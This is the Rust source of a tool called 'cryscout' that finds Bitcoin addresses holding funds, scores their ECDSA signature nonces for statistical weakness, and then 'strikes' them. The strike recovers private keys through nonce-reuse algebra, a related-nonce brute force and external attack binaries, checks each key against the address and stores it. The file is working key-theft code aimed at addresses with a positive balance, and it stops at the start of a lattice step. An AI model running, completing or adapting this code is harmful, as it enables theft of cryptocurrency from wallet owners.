
mod features;
use anyhow::Result;
use clap::{Parser, Subcommand};
use rusqlite::{params, Connection};
use sysinfo::System;
use std::time::Duration;
use tokio::time;
use std::process;
use chrono::Local;
use serde_json::Value;
use num_bigint::BigInt;
use num_traits::{Num, Zero};
use sha2::Digest;
use ort::{inputs, Session};
use ndarray::Array2;
use std::path::Path;

const DB_FILE: &str = "cryscout.db";
const MIN_SIGNATURES_FOR_SCORING: usize = 2;
const SYSTEM_CPU_CEILING: f32 = 85.0;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    Scanner,
    Analyzer,
    Striker,
}

struct WorkerState {
    worker_id: String,
    task: String,
    system: System,
}

impl WorkerState {
    fn new(task: String) -> Self {
        Self {
            worker_id: format!("{}-{}", task, process::id()),
            task,
            system: System::new_all(),
        }
    }

    fn log(&self, msg: &str) {
        let now = Local::now().format("%Y-%m-%d %H:%M:%S");
        println!("[{}] [{}] {}", now, self.worker_id, msg);
    }

    /// Yield CPU time when system load exceeds the ceiling.
    /// Call this between processing units (e.g. per-address in analyzer, per-target in striker).
    async fn throttle_if_needed(&mut self) {
        self.system.refresh_cpu_usage();
        let cpu = self.system.global_cpu_info().cpu_usage();
        if cpu > SYSTEM_CPU_CEILING {
            // Sleep proportional to how far over the ceiling we are
            let over = (cpu - SYSTEM_CPU_CEILING) as u64;
            let delay_ms = 1000 + over * 100; // 1s base + 100ms per % over
            time::sleep(Duration::from_millis(delay_ms.min(10000))).await;
        } else if cpu > SYSTEM_CPU_CEILING - 10.0 {
            // Approaching ceiling — light throttle to prevent overshoot
            time::sleep(Duration::from_millis(200)).await;
        }
    }
}

// --- Neural Logic (Hybrid: Deterministic Statistical Scorer + optional ONNX) ---

/// Deterministic anomaly scorer that interprets the 438-dim feature vector directly.
/// Feature layout:
///   [0..256]   = per-bit probability (should be ~0.5 for random nonces)
///   [256..288] = per-byte entropy normalized to [0,1] (should be ~1.0 for random)
///   [288..304] = LSB residue max-concentration for 2^1..2^16 (should be ~1/2^k for random)
///   [304..320] = MSB bit-length histogram for bits 241..256 (random = mostly 256-bit)
///   [320..352] = inter-sig delta bit-length histogram (random = spread near 255-256)
///   [352..358] = chi-squared mod small primes, /100, capped at 1.0 (should be ~0 for random)
///   [358..374] = autocorrelation lags 1..16 (should be ~0 for random)
///   [374..406] = FFT magnitude spectrum (should be low/flat for random)
///   [406..438] = reverse (LSB-side) byte entropy (should be ~1.0 for random)
fn deterministic_anomaly_score(feats: &[f32], num_sigs: usize) -> f32 {
    if feats.len() < 438 { return 0.5; }

    // Sample-size confidence: with N signatures, statistical features have
    // expected noise proportional to 1/sqrt(N). Below ~20 sigs, most
    // "deviations from ideal" are just sampling variance, not real bias.
    // confidence: 0.0 at N=2, ~0.5 at N=20, ~0.8 at N=50, ~0.95 at N=100
    let confidence = if num_sigs <= 2 { 0.0 } else {
        1.0 - 1.0 / (1.0 + (num_sigs as f64 - 2.0) / 25.0)
    };

    let mut score = 0.0f64;
    let mut weight_sum = 0.0f64;

    // 1. Bit distribution bias (features 0..256)
    //    For truly random nonces, each bit position has P(1) ≈ 0.5.
    //    Measure mean absolute deviation from 0.5.
    //    Expected noise floor for N sigs: ~0.5/sqrt(N)
    {
        let w = 3.0;
        let noise_floor = 0.5 / (num_sigs as f64).sqrt();
        let deviations: Vec<f64> = feats[0..256].iter()
            .map(|&p| ((p as f64 - 0.5).abs() - noise_floor).max(0.0))
            .collect();
        let mean_dev = deviations.iter().sum::<f64>() / 256.0;
        let max_dev = deviations.iter().cloned().fold(0.0f64, f64::max);
        let bit_score = (mean_dev * 8.0 + max_dev * 4.0).min(1.0);
        score += bit_score * w;
        weight_sum += w;
    }

    // 2. Byte entropy loss (features 256..288)
    //    Normalized entropy should be ~1.0. Low entropy = weak RNG.
    //    With N sigs, max possible byte entropy = log2(min(N, 256))/8.
    //    So we must compare against the achievable entropy, not 1.0.
    {
        let w = 4.0;
        let max_possible_entropy = (num_sigs.min(256) as f64).log2() / 8.0;
        let threshold = max_possible_entropy.min(1.0);
        let entropies: Vec<f64> = feats[256..288].iter().map(|&e| e as f64).collect();
        let mean_ent = entropies.iter().sum::<f64>() / 32.0;
        let min_ent = entropies.iter().cloned().fold(1.0f64, f64::min);
        let ent_loss = (threshold - mean_ent).max(0.0) / threshold.max(0.01);
        let worst_loss = (threshold - min_ent).max(0.0) / threshold.max(0.01);
        let ent_score = (ent_loss * 4.0 + worst_loss * 2.0).min(1.0);
        score += ent_score * w;
        weight_sum += w;
    }

    // 3. LSB bias (features 288..304)
    //    Max residue concentration for mod 2^k. For random: ~1/2^k.
    //    With small N, max_count/N naturally deviates from 1/2^k.
    //    Only count deviations that exceed the statistical noise threshold.
    {
        let w = 3.5;
        let mut lsb_score = 0.0;
        for k in 0..16usize {
            let observed = feats[288 + k] as f64;
            let expected = 1.0 / (1 << (k + 1)) as f64;
            // With N sigs and 2^(k+1) bins, sampling noise ~ sqrt(expected/N)
            let noise = (expected / num_sigs as f64).sqrt();
            if expected > 0.0 {
                let excess = (observed - expected - 2.0 * noise).max(0.0);
                let ratio = excess / expected;
                lsb_score += (ratio / 4.0).min(1.0);
            }
        }
        lsb_score /= 16.0;
        score += lsb_score * w;
        weight_sum += w;
    }

    // 4. MSB / short nonce concentration (features 304..320)
    //    Histogram of bit lengths 241..256. Random nonces are almost all 256-bit.
    //    Concentration at shorter lengths = MSB bias (top bits zero).
    {
        let w = 3.5;
        let short_frac: f64 = feats[304..319].iter().map(|&f| f as f64).sum(); // bits 241-255
        let _full_frac = feats[319] as f64; // bit length 256
        // If a significant fraction of nonces are shorter than 256 bits, that's bias
        // short_frac > 0.1 is suspicious, > 0.3 is very weak
        let msb_score = (short_frac * 3.0).min(1.0);
        score += msb_score * w;
        weight_sum += w;
    }

    // 5. Chi-squared modular residues (features 352..358)
    //    Already normalized: chi2/100, capped at 1.0. Higher = more biased.
    //    Chi-squared expected value scales with 1/N, so small samples inflate this.
    {
        let w = 2.5;
        // Chi2 expected baseline for small N: ~1/N * scaling_factor
        let chi_baseline = (1.0 / num_sigs as f64 * 10.0).min(0.5);
        let chi_scores: Vec<f64> = feats[352..358].iter()
            .map(|&c| (c as f64 - chi_baseline).max(0.0))
            .collect();
        let mean_chi = chi_scores.iter().sum::<f64>() / 6.0;
        let max_chi = chi_scores.iter().cloned().fold(0.0f64, f64::max);
        let chi_score = (mean_chi * 2.0 + max_chi).min(1.0);
        score += chi_score * w;
        weight_sum += w;
    }

    // 6. Autocorrelation (features 358..374)
    //    Should be ~0 for random. Strong autocorrelation = sequential/predictable nonces.
    //    Expected noise for N sigs: ~1/sqrt(N). Subtract noise floor.
    {
        let w = 3.0;
        let noise_floor = 1.0 / (num_sigs as f64).sqrt();
        let autocorrs: Vec<f64> = feats[358..374].iter()
            .map(|&a| ((a as f64).abs() - noise_floor).max(0.0))
            .collect();
        let mean_autocorr = autocorrs.iter().sum::<f64>() / 16.0;
        let max_autocorr = autocorrs.iter().cloned().fold(0.0f64, f64::max);
        let auto_score = (mean_autocorr * 5.0 + max_autocorr * 2.0).min(1.0);
        score += auto_score * w;
        weight_sum += w;
    }

    // 7. FFT spectral peaks (features 374..406)
    //    Strong peaks indicate periodicity in nonce generation.
    {
        let w = 2.5;
        let fft_mags: Vec<f64> = feats[374..406].iter().map(|&f| f as f64).collect();
        let mean_fft = fft_mags.iter().sum::<f64>() / 32.0;
        let max_fft = fft_mags.iter().cloned().fold(0.0f64, f64::max);
        // Ratio of max peak to mean: high ratio = single dominant frequency
        let peak_ratio = if mean_fft > 1e-9 { max_fft / mean_fft } else { 0.0 };
        let fft_score = ((peak_ratio - 1.0).max(0.0) / 10.0 + max_fft * 3.0).min(1.0);
        score += fft_score * w;
        weight_sum += w;
    }

    // 8. Reverse (LSB-side) entropy (features 406..438)
    //    Same logic as byte entropy but from the other end.
    {
        let w = 2.0;
        let rev_ents: Vec<f64> = feats[406..438].iter().map(|&e| e as f64).collect();
        let mean_rev = rev_ents.iter().sum::<f64>() / 32.0;
        let min_rev = rev_ents.iter().cloned().fold(1.0f64, f64::min);
        let rev_loss = (1.0 - mean_rev).max(0.0);
        let worst_rev = (1.0 - min_rev).max(0.0);
        let rev_score = (rev_loss * 4.0 + worst_rev * 2.0).min(1.0);
        score += rev_score * w;
        weight_sum += w;
    }

    // 9. Inter-signature delta concentration (features 320..352)
    //    Histogram of bit-length differences between consecutive R-values.
    //    For sequential/related nonces, deltas cluster at specific bit lengths.
    //    Random nonces produce deltas uniformly near 255-256 bits.
    {
        let w = 3.0;
        let delta_hist: Vec<f64> = feats[320..352].iter().map(|&f| f as f64).collect();
        // Check if deltas are concentrated (low bit-length = sequential nonces)
        let low_delta_frac: f64 = delta_hist[..16].iter().sum(); // deltas with bit_length < 257
        let max_bin = delta_hist.iter().cloned().fold(0.0f64, f64::max);
        // High concentration in any single bin = suspicious
        let noise_floor = 1.0 / 32.0 + 2.0 / (num_sigs as f64).sqrt();
        let peak_excess = (max_bin - noise_floor).max(0.0);
        let delta_score = (low_delta_frac * 2.0 + peak_excess * 5.0).min(1.0);
        score += delta_score * w;
        weight_sum += w;
    }

    // Weighted average → raw anomaly score
    let raw_prob = if weight_sum > 0.0 { score / weight_sum } else { 0.0 };

    // Apply sample-size confidence: with few sigs, pull score toward 0.5 (uncertain)
    let adjusted = 0.5 + (raw_prob - 0.5) * confidence;

    // Apply sigmoid-like sharpening so that borderline cases aren't all ~0.5
    let k = 8.0;
    let midpoint = 0.35; // Raised: require stronger evidence before flagging
    let sharpened = 1.0 / (1.0 + (-k * (adjusted - midpoint)).exp());

    sharpened as f32
}

/// Modular inverse using extended Euclidean algorithm for BigInt.
fn mod_inverse_bigint(a: &BigInt, modulus: &BigInt) -> Option<BigInt> {
    use num_bigint::BigInt;
    use num_traits::{Zero, One};

    let a = ((a % modulus) + modulus) % modulus;
    if a.is_zero() { return None; }

    let mut old_r = a;
    let mut r = modulus.clone();
    let mut old_s = BigInt::one();
    let mut s = BigInt::zero();

    while !r.is_zero() {
        let q = &old_r / &r;
        let temp_r = r.clone();
        r = &old_r - &q * &r;
        old_r = temp_r;
        let temp_s = s.clone();
        s = &old_s - &q * &s;
        old_s = temp_s;
    }

    if old_r != BigInt::one() { return None; }
    Some(((old_s % modulus) + modulus) % modulus)
}

/// Convert BigInt to 32-byte big-endian array, reduced mod secp256k1 order.
fn bigint_to_32bytes(bi: &BigInt) -> [u8; 32] {
    use num_integer::Integer;
    let n = BigInt::from_str_radix("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16).unwrap();
    let reduced = bi.mod_floor(&n);
    let bytes = reduced.to_bytes_be().1;
    let mut padded = [0u8; 32];
    let start = 32usize.saturating_sub(bytes.len());
    let b_start = bytes.len().saturating_sub(32);
    padded[start..].copy_from_slice(&bytes[b_start..]);
    padded
}

/// GCD for BigInt values.
fn gcd_bigint(a: &BigInt, b: &BigInt) -> BigInt {
    use num_traits::Zero;
    let mut a = if a < &BigInt::zero() { -a.clone() } else { a.clone() };
    let mut b = if b < &BigInt::zero() { -b.clone() } else { b.clone() };
    while !b.is_zero() {
        let t = b.clone();
        b = &a % &b;
        a = t;
    }
    a
}

/// Estimate how many MSBs of the nonce k are biased (zero or predictable).
/// Returns a sorted list of bits_known values to try, from most likely to least.
///
/// The HNP lattice attack works when the top `bits_known` bits of each nonce k
/// are zero (or known). We estimate this from R-value statistics:
///   - R = k*G projected to x-coordinate, so short R (fewer bits) implies short k
///   - Byte entropy loss in upper bytes implies structured/low-entropy nonces
///   - MSB concentration patterns reveal how many top bits are zero
fn estimate_nonce_bias(r_values: &[BigInt]) -> Vec<usize> {
    if r_values.is_empty() { return vec![8]; }

    let n = r_values.len();
    let mut estimates = Vec::new();

    // Method 1: Bit-length analysis
    // If nonce k has top B bits zero, then k < 2^(256-B), so bit_length(k) ≤ 256-B.
    // R is derived from k, so short R values correlate with short k values.
    let bit_lengths: Vec<usize> = r_values.iter().map(|r| r.bits() as usize).collect();
    let mean_bl = bit_lengths.iter().sum::<usize>() as f64 / n as f64;
    let min_bl = *bit_lengths.iter().min().unwrap_or(&256);

    // For random 256-bit nonces, mean bit length ≈ 255.5
    // If mean is significantly lower, estimate bits_known from the deficit
    let bl_deficit = (256.0 - mean_bl).max(0.0);
    if bl_deficit > 0.5 {
        estimates.push((bl_deficit.round() as usize).max(1).min(128));
    }

    // The minimum bit length gives us the strongest single-signature signal
    let min_deficit = 256 - min_bl;
    if min_deficit > 0 && min_deficit <= 128 {
        estimates.push(min_deficit);
    }

    // Method 2: Upper-byte entropy analysis
    // For each of the top 4 bytes (bytes 0-3), check entropy.
    // If entropy is < 0.5 (normalized), those bytes are heavily biased.
    let mut r_bytes_list = Vec::with_capacity(n);
    for r in r_values {
        let mut b = r.to_bytes_be().1;
        if b.len() < 32 {
            let mut padded = vec![0u8; 32 - b.len()];
            padded.extend(b);
            b = padded;
        } else if b.len() > 32 {
            b = b[b.len()-32..].to_vec();
        }
        r_bytes_list.push(b);
    }

    let mut biased_bytes = 0usize;
    for byte_pos in 0..4 {
        let mut counts = [0u32; 256];
        for bytes in &r_bytes_list {
            counts[bytes[byte_pos] as usize] += 1;
        }
        let mut entropy = 0.0f64;
        for &c in &counts {
            if c > 0 {
                let p = c as f64 / n as f64;
                entropy -= p * p.log2();
            }
        }
        let norm_entropy = entropy / 8.0;
        if norm_entropy < 0.5 {
            biased_bytes += 1;
        } else {
            break; // Once we hit a high-entropy byte, stop
        }
    }
    if biased_bytes > 0 {
        estimates.push(biased_bytes * 8);
        // Also try biased_bytes * 8 ± 4 for finer granularity
        if biased_bytes * 8 > 4 {
            estimates.push(biased_bytes * 8 - 4);
        }
        estimates.push(biased_bytes * 8 + 4);
    }

    // Method 3: Fraction of nonces shorter than various thresholds
    for threshold_bits in [248usize, 240, 232, 224] {
        let short_count = bit_lengths.iter().filter(|&&bl| bl <= threshold_bits).count();
        let frac = short_count as f64 / n as f64;
        if frac > 0.2 {
            // More than 20% of nonces are below this threshold
            estimates.push(256 - threshold_bits);
        }
    }

    // Deduplicate, sort, and ensure we always have something to try
    estimates.sort();
    estimates.dedup();
    estimates.retain(|&b| b >= 1 && b <= 128);

    // Always include the default as a fallback
    if !estimates.contains(&8) {
        estimates.push(8);
    }

    // Sort by most aggressive (highest bits_known) first — highest chance of success
    // if the bias is real, but also fastest to fail if not
    estimates.sort_by(|a, b| b.cmp(a));

    // Cap at 4 trials to stay within the 600s total budget
    estimates.truncate(4);

    estimates
}

async fn run_neural_inference(state: &WorkerState, r_values: &[BigInt]) -> Result<f32> {
    if let Some(feats) = features::NonceFeatures::extract_neural_features(r_values) {
        // Primary: deterministic statistical anomaly scorer
        let det_score = deterministic_anomaly_score(&feats, r_values.len());

        // Secondary: ONNX model if available and calibrated
        let model_path = "nonce_anomaly_model.onnx";
        let onnx_score = if Path::new(model_path).exists() {
            match Session::builder().and_then(|b| b.commit_from_file(model_path)) {
                Ok(session) => {
                    let input_tensor = Array2::from_shape_vec((1, 438), feats)?;
                    match session.run(inputs![input_tensor]?) {
                        Ok(outputs) => {
                            let output_tensor = outputs["output"].try_extract_tensor::<f32>()?;
                            let p = output_tensor[[0, 0]];
                            // Only trust ONNX if it's not stuck in the 0.50-0.52 dead zone
                            if (p - 0.5).abs() > 0.05 {
                                Some(p)
                            } else {
                                None // Model is uncalibrated, ignore
                            }
                        }
                        Err(_) => None,
                    }
                }
                Err(_) => None,
            }
        } else {
            None
        };

        // Combine: if ONNX is responsive, blend 70% deterministic + 30% ONNX
        let final_score = match onnx_score {
            Some(onnx) => {
                state.log(&format!("    [Hybrid] Det={:.4}, ONNX={:.4}", det_score, onnx));
                det_score * 0.7 + onnx * 0.3
            }
            None => det_score,
        };

        Ok(final_score)
    } else {
        Err(anyhow::anyhow!("Could not extract neural features"))
    }
}

// --- Striker Logic ---
async fn run_striker(state: &mut WorkerState) -> Result<bool> {
    let mut conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &30000)?;
    
    // 1. Find targets and mark them as processing immediately in a transaction
    let targets: Vec<(String, f64, i64, String, f64)> = {
        let tx = conn.transaction()?;
        let t_list: Vec<(String, f64, i64, String, f64)> = {
            let mut stmt = tx.prepare(
                "SELECT a.address, a.balance, COUNT(s.id), MAX(s.pubkey_hex), a.vulnerability_score
                 FROM addresses a JOIN signatures s ON a.address = s.address
                 WHERE a.balance > 0
                   AND (a.sigs_scanned = 0 OR a.sigs_scanned IS NULL)
                   AND (a.processing_by IS NULL OR a.processing_since < datetime('now', '-1 hour'))
                   AND a.vulnerability_score > 0
                 GROUP BY a.address HAVING COUNT(s.id) >= 2
                 ORDER BY COUNT(s.id) DESC, a.vulnerability_score DESC
                 LIMIT 5"
            )?;
            let res = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?, row.get(4)?)))?.collect::<rusqlite::Result<Vec<_>>>()?;
            res
        };
        
        for (addr, _, _, _, _) in &t_list {
            tx.execute("UPDATE addresses SET processing_by = ?1, processing_since = datetime('now') WHERE address = ?2", params![&state.worker_id, addr])?;
        }
        tx.commit()?;
        t_list
    };
    
    if targets.is_empty() {
        return Ok(false);
    }

    state.log(&format!("Executing high-precision strike on {} targets...", targets.len()));

    for (addr, _bal, count, pubkey, score) in targets {
        state.throttle_if_needed().await;
        state.log(&format!("LAUNCHING PRECISION STRIKE: {} (Score: {:.3}, {} sigs)", addr, score, count));
        let strike_result: Result<()> = async {
            let mut sig_stmt = conn.prepare("SELECT DISTINCT r_hex, s_hex, z_hex FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?;
            let sigs_for_json: Vec<Value> = sig_stmt.query_map(params![&addr], |r| {
                Ok(serde_json::json!({ "r": r.get::<_, String>(0)?, "s": r.get::<_, String>(1)?, "z": r.get::<_, String>(2)? }))
            })?.collect::<rusqlite::Result<Vec<_>>>()?;

            let sigs_for_features: Vec<BigInt> = conn.prepare("SELECT DISTINCT r_int FROM signatures WHERE address = ?1 ORDER BY id DESC LIMIT 256")?
                .query_map(params![&addr], |r| r.get::<_, String>(0))?
                .collect::<rusqlite::Result<Vec<String>>>()?
                .into_iter()
                .map(|s| BigInt::from_str_radix(&s, 10).unwrap_or_default())
                .collect();

            let sigs_file = format!("temp_sigs_{}.json", addr);
            std::fs::write(&sigs_file, serde_json::to_string(&sigs_for_json)?)?;

            let result = async {
                state.log("  [0/8] Checking for Nonce Reuse (R-Reuse) + key recovery...");
                {
                    use num_integer::Integer;
                    let n_order = BigInt::from_str_radix(
                        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16
                    ).unwrap();

                    for i in 0..sigs_for_json.len() {
                        for j in (i + 1)..sigs_for_json.len() {
                            let r1_hex = sigs_for_json[i]["r"].as_str().unwrap_or("");
                            let r2_hex = sigs_for_json[j]["r"].as_str().unwrap_or("");
                            let s1_hex = sigs_for_json[i]["s"].as_str().unwrap_or("");
                            let s2_hex = sigs_for_json[j]["s"].as_str().unwrap_or("");
                            let z1_hex = sigs_for_json[i]["z"].as_str().unwrap_or("");
                            let z2_hex = sigs_for_json[j]["z"].as_str().unwrap_or("");

                            if r1_hex == r2_hex && s1_hex != s2_hex && !r1_hex.is_empty() {
                                state.log(&format!("  [!!!] R-REUSE DETECTED for {}! Attempting key recovery...", addr));
                                let _ = conn.execute(
                                    "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                                    params![addr, "Nonce Reuse", "CRITICAL", "Identical R values with different S/Z found."],
                                );

                                // Recover private key: d = (s1*z2 - s2*z1) / (s2*r - s1*r) mod n
                                // Equivalently: k = (z1-z2)/(s1-s2), d = (s1*k - z1)/r
                                if let (Ok(r_bi), Ok(s1_bi), Ok(s2_bi), Ok(z1_bi), Ok(z2_bi)) = (
                                    BigInt::from_str_radix(r1_hex, 16),
                                    BigInt::from_str_radix(s1_hex, 16),
                                    BigInt::from_str_radix(s2_hex, 16),
                                    BigInt::from_str_radix(z1_hex, 16),
                                    BigInt::from_str_radix(z2_hex, 16),
                                ) {
                                    let ds = (&s1_bi - &s2_bi).mod_floor(&n_order);
                                    if !ds.is_zero() {
                                        let ds_inv = ds.extended_gcd(&n_order).x.mod_floor(&n_order);
                                        let k = ((&z1_bi - &z2_bi) * &ds_inv).mod_floor(&n_order);
                                        if !k.is_zero() {
                                            let r_inv = r_bi.extended_gcd(&n_order).x.mod_floor(&n_order);
                                            let d = ((&s1_bi * &k - &z1_bi) * &r_inv).mod_floor(&n_order);

                                            if !d.is_zero() {
                                                let privkey_hex = format!("{:064x}", d);
                                                state.log(&format!("  [!!!] CANDIDATE KEY: 0x{}...", &privkey_hex[..16]));

                                                // Verify key matches the address
                                                if let Ok(d_bytes) = hex::decode(&privkey_hex) {
                                                    if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                                                        let vk = sk.verifying_key();
                                                        let mut match_found = false;
                                                        for compressed in [true, false] {
                                                            let encoded = vk.to_encoded_point(compressed);
                                                            let pubkey_bytes = encoded.as_bytes();
                                                            let mut sha256_h = sha2::Sha256::new();
                                                            sha256_h.update(pubkey_bytes);
                                                            let sha256_hash = sha256_h.finalize();
                                                            let mut ripemd_h = ripemd::Ripemd160::new();
                                                            ripemd_h.update(&sha256_hash);
                                                            let h160 = ripemd_h.finalize();
                                                            if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                                                if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                                    match_found = true;
                                                                    break;
                                                                }
                                                            }
                                                        }
                                                        if match_found {
                                                            state.log(&format!("  [!!!] VERIFIED KEY RECOVERY for {}!", addr));
                                                            let _ = conn.execute(
                                                                "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                                                params![addr, format!("0x{}", privkey_hex), "Nonce Reuse Recovery"],
                                                            );
                                                        } else {
                                                            // Try n-d (ECDSA sign ambiguity)
                                                            let d_alt = &n_order - &d;
                                                            let alt_hex = format!("{:064x}", d_alt);
                                                            if let Ok(d2_bytes) = hex::decode(&alt_hex) {
                                                                if let Ok(sk2) = k256::ecdsa::SigningKey::from_slice(&d2_bytes) {
                                                                    let vk2 = sk2.verifying_key();
                                                                    for compressed in [true, false] {
                                                                        let encoded = vk2.to_encoded_point(compressed);
                                                                        let pubkey_bytes = encoded.as_bytes();
                                                                        let mut sha256_h = sha2::Sha256::new();
                                                                        sha256_h.update(pubkey_bytes);
                                                                        let sha256_hash = sha256_h.finalize();
                                                                        let mut ripemd_h = ripemd::Ripemd160::new();
                                                                        ripemd_h.update(&sha256_hash);
                                                                        let h160 = ripemd_h.finalize();
                                                                        if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                                                            if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                                                state.log(&format!("  [!!!] VERIFIED KEY RECOVERY (alt) for {}!", addr));
                                                                                let _ = conn.execute(
                                                                                    "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                                                                    params![addr, format!("0x{}", alt_hex), "Nonce Reuse Recovery"],
                                                                                );
                                                                                break;
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                            state.log(&format!("  [!] Key candidate did not match address {}", addr));
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                // Inline related-nonce attack: try small deltas between consecutive sig pairs
                state.log("  [0.5/8] Related Nonce Attack (delta 1..1000)...");
                'related_nonce: {
                    use num_integer::Integer;
                    let n_order = BigInt::from_str_radix(
                        "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141", 16
                    ).unwrap();

                    if sigs_for_json.len() < 3 { break 'related_nonce; }
                    let limit = sigs_for_json.len().min(20);

                    for i in 0..limit.saturating_sub(2) {
                        let j = i + 1;
                        let vk_idx = i + 2;

                        let parse = |idx: usize, field: &str| -> Option<BigInt> {
                            BigInt::from_str_radix(sigs_for_json[idx][field].as_str()?, 16).ok()
                        };
                        let (Some(r1), Some(s1), Some(z1)) = (parse(i, "r"), parse(i, "s"), parse(i, "z")) else { continue };
                        let (Some(r2), Some(s2), Some(z2)) = (parse(j, "r"), parse(j, "s"), parse(j, "z")) else { continue };
                        let (Some(r3), Some(s3), Some(z3)) = (parse(vk_idx, "r"), parse(vk_idx, "s"), parse(vk_idx, "z")) else { continue };

                        let s1_inv = s1.extended_gcd(&n_order).x.mod_floor(&n_order);
                        let s2s1inv = (&s2 * &s1_inv).mod_floor(&n_order);
                        let lhs_coeff = (&s2s1inv * &r1 - &r2).mod_floor(&n_order);
                        if lhs_coeff.is_zero() { continue; }
                        let lhs_inv = lhs_coeff.extended_gcd(&n_order).x.mod_floor(&n_order);
                        let base_rhs = (&z2 - &s2s1inv * &z1).mod_floor(&n_order);
                        let s3_inv = s3.extended_gcd(&n_order).x.mod_floor(&n_order);

                        for delta_val in 1..=1000i64 {
                            for sign in [1i64, -1] {
                                let delta = BigInt::from(delta_val * sign);
                                let rhs = (&base_rhs - &s2 * &delta).mod_floor(&n_order);
                                let d = (&rhs * &lhs_inv).mod_floor(&n_order);
                                if d.is_zero() { continue; }

                                // Verify against 3rd sig
                                let k1 = (&s1_inv * (&z1 + &r1 * &d)).mod_floor(&n_order);
                                let k3 = (&s3_inv * (&z3 + &r3 * &d)).mod_floor(&n_order);
                                let expected_diff = (BigInt::from(2) * &delta).mod_floor(&n_order);
                                if (&k3 - &k1).mod_floor(&n_order) != expected_diff { continue; }

                                let privkey_hex = format!("{:064x}", d);
                                state.log(&format!("  [!!!] RELATED NONCE HIT (delta={})! Verifying key...", delta_val * sign));

                                // Verify key matches address
                                if let Ok(d_bytes) = hex::decode(&privkey_hex) {
                                    if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                                        let vk = sk.verifying_key();
                                        for compressed in [true, false] {
                                            let encoded = vk.to_encoded_point(compressed);
                                            let pubkey_bytes = encoded.as_bytes();
                                            let mut sha256_h = sha2::Sha256::new();
                                            sha256_h.update(pubkey_bytes);
                                            let sha256_hash = sha256_h.finalize();
                                            let mut ripemd_h = ripemd::Ripemd160::new();
                                            ripemd_h.update(&sha256_hash);
                                            let h160 = ripemd_h.finalize();
                                            if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                                if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                    state.log(&format!("  [!!!] VERIFIED RELATED-NONCE RECOVERY for {}!", addr));
                                                    let _ = conn.execute(
                                                        "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                                        params![addr, format!("0x{}", privkey_hex), "Related Nonce Recovery"],
                                                    );
                                                    break 'related_nonce;
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                state.log("  [1/8] Nonce Relation Attack...");
                if let Ok(Ok(out1)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/nonce_relation_rs").arg("--sigs").arg(&sigs_file).arg("--pubkey").arg(&pubkey).output()).await {
                    let stdout = String::from_utf8_lossy(&out1.stdout);
                    if stdout.contains("SUCCESS") {
                        if let Some(key_line) = stdout.lines().find(|l| l.contains("Private Key:")) {
                            let privkey = key_line.split("Private Key:").last().unwrap_or("").trim().trim_start_matches("0x");
                            if let Ok(d_bytes) = hex::decode(privkey) {
                                if let Ok(sk) = k256::ecdsa::SigningKey::from_slice(&d_bytes) {
                                    let vk = sk.verifying_key();
                                    let mut match_found = false;
                                    for compressed in [true, false] {
                                        let encoded = vk.to_encoded_point(compressed);
                                        let pubkey_bytes = encoded.as_bytes();
                                        let mut sha256 = sha2::Sha256::new();
                                        sha256.update(pubkey_bytes);
                                        let sha256_hash = sha256.finalize();
                                        let mut ripemd160 = ripemd::Ripemd160::new();
                                        ripemd160.update(&sha256_hash);
                                        let h160 = ripemd160.finalize();
                                        if let Ok(decoded) = bs58::decode(&addr).into_vec() {
                                            if decoded.len() == 25 && decoded[1..21] == h160[..] {
                                                match_found = true;
                                                break;
                                            }
                                        }
                                    }
                                    if match_found {
                                        state.log(&format!("  [!!!] VERIFIED SUCCESS: Found key for {}!", addr));
                                        conn.execute(
                                            "INSERT OR IGNORE INTO recovered_keys (address, privkey_hex, method, found_at) VALUES (?1, ?2, ?3, datetime('now'))",
                                            params![addr, format!("0x{}", privkey), "Strike Method"],
                                        )?;
                                    } else {
                                        state.log(&format!("  [!] REJECTED: Found key 0x{} for {} but it did not match address!", privkey, addr));
                                    }

                                }
                            }
                        }
                    }
                } else {
                    state.log("  [!] Nonce Relation Attack timed out.");
                }

                state.log("  [2/8] Spectral Bias Detection (FFT)...");
                if let Ok(Ok(out2)) = time::timeout(Duration::from_secs(600), tokio::process::Command::new("./target/release/bias_detector_rs").arg(&addr).output()).await {
                    let stdout = String::from_utf8_lossy(&out2.stdout);
                    if stdout.contains("Potential Bias") {
                        state.log(&format!("  [!] BIAS DETECTED for {}: Spectral peak identified.", addr));
                        let _ = conn.execute(
                            "INSERT OR IGNORE INTO vulnerabilities (address, type, severity, found_at, details) VALUES (?1, ?2, ?3, datetime('now'), ?4)",
                            params![addr, "Spectral Bias", "High", "Peak frequency detected in nonce distribution"],
                        );
                    }
                } else {
                    state.log("  [!] Spectral Bias Detection timed out.");
                }

                state.log("  [3/8] Lattice HNP (LLL)...");
